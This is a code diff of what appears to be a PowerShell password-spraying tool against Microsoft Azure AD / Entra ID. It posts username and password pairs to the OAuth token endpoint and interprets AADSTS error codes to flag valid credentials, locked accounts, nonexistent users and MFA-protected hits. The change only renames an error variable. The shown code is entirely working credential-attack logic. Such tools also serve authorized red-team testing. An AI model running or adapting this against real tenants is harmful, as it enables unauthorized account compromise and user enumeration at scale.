@@ -59,7 +59,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
         # Web Request Info
         $BodyParams = @{'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d' ; 'client_info' = '1' ; 'grant_type' = 'password' ; username = $usernames[$counter] ; 'password' = $passes ; 'scope' = 'openid'}
         $postHeaders =  @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'}
-        $wr = Invoke-WebRequest -Uri $url/organizations/oauth2/v2.0/token -Method Post -Headers $postHeaders -Body $BodyParams -ErrorVariable errRes
+        $wr = Invoke-WebRequest -Uri $url/organizations/oauth2/v2.0/token -Method Post -Headers $postHeaders -Body $BodyParams -ErrorVariable responseCode
 
         If ($wr.StatusCode -eq "200"){
             Write-Host -ForegroundColor "green" "[*] SUCCESS! $un : $passes"
@@ -69,30 +69,30 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
         }
         else{
             # Incorrect username or password
-            if ($errRes -match "AADSTS50126")
+            if ($responseCode -match "AADSTS50126")
             {
                 Write-Host "    The password for $un appears to be incorrect."
             }
             # Account Locked
-            ElseIf($errRes -match "AADSTS50053")
+            ElseIf($responseCode -match "AADSTS50053")
             {
                 Write-Host -ForegroundColor "red" "    WARNING! $un appears to be locked, skipping further attempts"
                 break
             }
             # Invalid Username
-            ElseIf($errRes -match "AADSTS50034")
+            ElseIf($responseCode -match "AADSTS50034")
             {
                 Write-Host -ForegroundColor "yellow" "    $un doesn't exist, skipping further attempts.."
                 break
             }
             # Invalid Tenant
-            ElseIf($errRes -match "AADSTS50059")
+            ElseIf($responseCode -match "AADSTS50059")
             {
                 Write-Host "    Supplied tenant for $un doesn't exist, skipping further attempts.."
                 break
             }
             # MFA
-            ElseIf($errRes -match "AADSTS50076")
+            ElseIf($responseCode -match "AADSTS50076")
             {
                 Write-Host -ForegroundColor "Cyan" "[*] Password for $un is correct but user has MFA enabled (DUO or MS)"
                 break
